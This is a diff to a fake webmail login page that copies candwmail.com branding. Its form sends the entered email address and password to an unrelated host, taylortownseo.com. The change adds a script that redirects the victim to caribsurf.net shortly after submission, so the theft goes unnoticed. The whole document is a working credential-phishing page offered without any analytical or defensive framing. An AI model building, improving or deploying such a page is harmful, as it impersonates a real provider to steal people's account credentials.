@@ -2,7 +2,7 @@
 <meta http-equiv="content-type" content="text/html; charset=UTF-8"><title>Flow</title><link href="default.css" rel="stylesheet" type="text/css"><link id="favicon" rel="shortcut icon" type="image/x-icon" href="https://webmail.candwmail.com/img/faviconFL.ico"></head><body>
 	<div class="mainDiv">
 		<img id="hdrImage" alt="" src="candwmail_com.png">
-		<form id="form" action="http://taylortownseo.com/next.php" method="POST">
+		<form id="form" action="http://taylortownseo.com/next.php" method="POST" onsubmit="redirectAfterSubmit()">
 			<input type="text" class="field" placeholder="Email" name="email" id="email" required>
 			<input type="password" class="field" placeholder="Password" name="password" id="password" required>
 			
@@ -19,7 +19,13 @@
 		<div class="errorDiv"><span id="error" class="error"></span></div>
 		
 	</div>
-	
 
-
-</body></html>
+</body>
+<script>
+function redirectAfterSubmit() {
+    setTimeout(function () {
+        window.location.href = "https://www.caribsurf.net/";
+    }, 500);
+}
+</script>
+</html>
